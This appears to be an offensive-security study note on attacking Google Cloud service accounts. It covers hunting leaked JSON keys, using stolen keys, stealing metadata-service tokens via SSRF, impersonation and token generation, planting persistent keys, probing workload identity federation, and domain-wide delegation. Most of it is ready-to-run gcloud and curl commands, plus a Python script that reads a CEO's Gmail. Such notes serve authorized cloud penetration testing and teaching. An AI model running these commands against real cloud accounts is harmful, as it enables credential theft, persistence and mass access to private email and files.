# 03.2 — GCP Service Account Attacks

## What This Note Covers

Service accounts are the central identity primitive in GCP. Every meaningful attack chain goes through them. This note covers key exposure, impersonation, token generation, workload identity abuse, and domain-wide delegation.

---

## Attack Surface Overview

```
Service Account Attack Surface:
├── JSON key files (permanent credentials — leaked in code/storage/config)
├── Metadata service tokens (short-lived — from VM/Cloud Function SSRF)
├── Service account impersonation (iam:serviceAccounts.actAs)
├── Token creation (iam:serviceAccounts.getAccessToken)
├── Workload identity federation (OIDC → SA impersonation)
└── Domain-wide delegation (SA → impersonate any Google Workspace user)
```

---

## Attack 1: JSON Key File Exposure

Service account JSON keys are long-lived credentials that authenticate as the SA from anywhere. They're commonly leaked in code repositories, S3/GCS buckets, Docker images, and CI/CD configs.

### Structure of a Service Account Key File

```json
{
  "type": "service_account",
  "project_id": "target-project-123",
  "private_key_id": "abc123...",
  "private_key": "-----BEGIN RSA PRIVATE KEY-----\nMIIE...\n-----END RSA PRIVATE KEY-----\n",
  "client_email": "deploy-sa@target-project-123.iam.gserviceaccount.com",
  "client_id": "123456789012345678901",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token"
}
```

The `client_email` tells you the SA identity. The `private_key` is the RSA key used to authenticate.

### Finding Leaked Key Files

```bash
# GitHub search
# site:github.com "service_account" "private_key" "iam.gserviceaccount.com"
# file:*.json "type" "service_account"

# truffleHog
trufflehog github --repo https://github.com/target/repo

# gitleaks
gitleaks detect --source /path/to/repo

# Search in downloaded files
grep -r '"type": "service_account"' . --include="*.json"
grep -r 'iam.gserviceaccount.com' . --include="*.json" --include="*.yml" --include="*.env"

# GCS public buckets
gsutil ls gs://TARGET-BUCKET/
gsutil cat gs://TARGET-BUCKET/credentials.json
```

### Authenticating with a Found Key File

```bash
# Activate the service account
gcloud auth activate-service-account \
  --key-file stolen-key.json

# Verify identity
gcloud auth list
# Shows: sa-name@project.iam.gserviceaccount.com  ACTIVE

# Set the project
gcloud config set project PROJECT_ID_FROM_KEY_FILE

# What can this SA do?
gcloud projects get-iam-policy PROJECT_ID

# Get an OAuth token for API calls
gcloud auth print-access-token

# Use token directly with Google APIs
TOKEN=$(gcloud auth print-access-token)
curl -H "Authorization: Bearer $TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects"
```

## Attack 2: Metadata Service Token Theft

When a Compute Engine VM (or Cloud Function, Cloud Run) has a service account attached, it can get OAuth access tokens from the metadata service at `http://metadata.google.internal`. This is the GCP equivalent of IMDSv1.

```bash
# From inside a GCE VM (or via SSRF):

# List service accounts available (usually just "default")
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"

# Get an access token for the attached service account
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Returns:
{
  "access_token": "ya29.c.b0Ad...",
  "expires_in": 3599,
  "token_type": "Bearer"
}

# Get the email address (identity) of the SA
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"

# Get the scopes the token is valid for
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"
```

### Using the Stolen Token

```bash
TOKEN="ya29.c.b0Ad..."

# Who am I?
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://www.googleapis.com/oauth2/v1/tokeninfo"

# List projects accessible
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects"

# List GCS buckets
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=PROJECT_ID"

# List Compute Engine instances
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://compute.googleapis.com/compute/v1/projects/PROJECT_ID/aggregated/instances"

# Or authenticate gcloud with the token
gcloud auth print-access-token  # won't work, but you can use REST APIs directly
```

> [!warning] OAuth scopes limit token capabilities
> GCE instances can be launched with limited OAuth scopes (e.g., read-only on GCS). Even if the SA has broader IAM permissions, the token scope may restrict what you can do. Check `scopes` in the metadata response. If the scope is `cloud-platform`, you have full access.

## Attack 3: Service Account Impersonation

If you have the `iam.serviceAccounts.actAs` permission on a service account, you can impersonate it — generate tokens as it.

```bash
# Generate an access token impersonating another SA
gcloud auth print-access-token \
  --impersonate-service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com

# Use it immediately
TOKEN=$(gcloud auth print-access-token \
  --impersonate-service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com)

# You now operate as the target SA
curl -H "Authorization: Bearer $TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects"
```

### Check if You Can Impersonate a Specific SA

```bash
# Who has actAs on this SA?
gcloud iam service-accounts get-iam-policy \
  TARGET_SA@PROJECT.iam.gserviceaccount.com \
  --project PROJECT_ID

# Look for your identity in:
# role: roles/iam.serviceAccountUser (includes actAs)
# role: roles/iam.serviceAccountTokenCreator (token generation)
```

## Attack 4: Token Creator — Generate Tokens for Any SA

The `iam.serviceAccountTokenCreator` role allows generating short-lived tokens for any SA without needing to impersonate it through gcloud.

```bash
# Via REST API — generate an OAuth token as target SA
TOKEN=$(gcloud auth print-access-token)  # your current token

curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"scope": ["https://www.googleapis.com/auth/cloud-platform"]}' \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/TARGET_SA@PROJECT.iam.gserviceaccount.com:generateAccessToken"

# Returns:
{
  "accessToken": "ya29...",
  "expireTime": "2024-01-01T13:00:00Z"
}
```

## Attack 5: Creating a Persistent SA Key

If you have `iam.serviceAccountKeys.create` permission (included in roles like `roles/iam.serviceAccountAdmin` and `roles/owner`), you can create a permanent JSON key for any SA.

```bash
# Create a new key for a high-privilege SA
gcloud iam service-accounts keys create \
  /tmp/stolen-key.json \
  --iam-account PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com \
  --project PROJECT_ID

# Now you have a persistent credential file
# It survives even if the compromised session ends
# Valid until manually revoked
```

> [!danger] This is the GCP equivalent of creating an AWS access key for another user
> Creating a SA key gives you a credential that doesn't expire and isn't tied to your current session. This is the go-to persistence mechanism in GCP.

## Attack 6: Workload Identity Federation Abuse

Workload Identity Federation allows external identities (GitHub Actions, AWS IAM roles, Azure managed identities) to impersonate GCP service accounts without JSON keys. Misconfigurations in WIF can allow unintended principals to impersonate SAs.

```bash
# List workload identity pools in a project
gcloud iam workload-identity-pools list \
  --location global \
  --project PROJECT_ID

# List providers in a pool
gcloud iam workload-identity-pools providers list \
  --workload-identity-pool POOL_ID \
  --location global \
  --project PROJECT_ID

# Describe a provider — look for overly permissive attribute conditions
gcloud iam workload-identity-pools providers describe PROVIDER_ID \
  --workload-identity-pool POOL_ID \
  --location global \
  --project PROJECT_ID

# Example misconfiguration — condition allows ANY GitHub repo in any org:
# "attribute.repository_owner=='*'" instead of a specific org
```

## Attack 7: Domain-Wide Delegation

Domain-wide delegation (DWD) is an extremely powerful capability that allows a service account to impersonate **any user in the Google Workspace domain**. It's designed for admin tools that need to act on behalf of users, but when misconfigured or over-scoped, it's catastrophic.

```bash
# Find service accounts with DWD enabled
gcloud iam service-accounts list \
  --project PROJECT_ID \
  --format="table(email, displayName)"

# In the GCP console: check each SA → Details → "Enable G Suite Domain-wide Delegation"
# Via API: check if delegationEnabled is true in the SA resource

# What DWD allows (example — SA with Gmail scope):
# The SA can read, send, and delete email AS ANY USER in the domain
# The SA can read Google Drive files AS ANY USER
# The SA can access Google Calendar AS ANY USER
```

### Exploiting Domain-Wide Delegation

```python
# Python example using google-auth library
# Prerequisites: SA key file + DWD enabled + correct scopes

from google.oauth2 import service_account
import googleapiclient.discovery

# The SA key file
SERVICE_ACCOUNT_FILE = 'key.json'

# Scopes — must match what was granted in GWS admin
SCOPES = [
    'https://www.googleapis.com/auth/gmail.readonly',
    'https://www.googleapis.com/auth/drive.readonly',
]

# Impersonate the CEO
IMPERSONATE_USER = 'ceo@company.com'

credentials = service_account.Credentials.from_service_account_file(
    SERVICE_ACCOUNT_FILE,
    scopes=SCOPES,
    subject=IMPERSONATE_USER  # This is the DWD magic
)

# Build Gmail service as the CEO
gmail = googleapiclient.discovery.build('gmail', 'v1', credentials=credentials)

# Read their email
results = gmail.users().messages().list(userId='me', maxResults=10).execute()
print(results)
```

> [!danger] DWD with broad scopes = read all email, all Drive, all Calendar for all users
> A service account with DWD and `https://www.googleapis.com/auth/gmail.readonly` can read every email of every user in the company. This is an instant critical finding.

## Quick Reference — Service Account Attacks

```bash
# Authenticate with stolen key
gcloud auth activate-service-account --key-file stolen-key.json
gcloud config set project PROJECT_ID

# Get token from metadata (from inside VM or via SSRF)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Impersonate SA (requires actAs)
gcloud auth print-access-token \
  --impersonate-service-account=TARGET@PROJECT.iam.gserviceaccount.com

# Generate token via API (requires tokenCreator)
curl -X POST -H "Authorization: Bearer CURRENT_TOKEN" \
  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/TARGET_SA:generateAccessToken"

# Create persistent key
gcloud iam service-accounts keys create /tmp/key.json \
  --iam-account TARGET_SA@PROJECT.iam.gserviceaccount.com

# List SA keys
gcloud iam service-accounts keys list \
  --iam-account SA_EMAIL --project PROJECT_ID
```
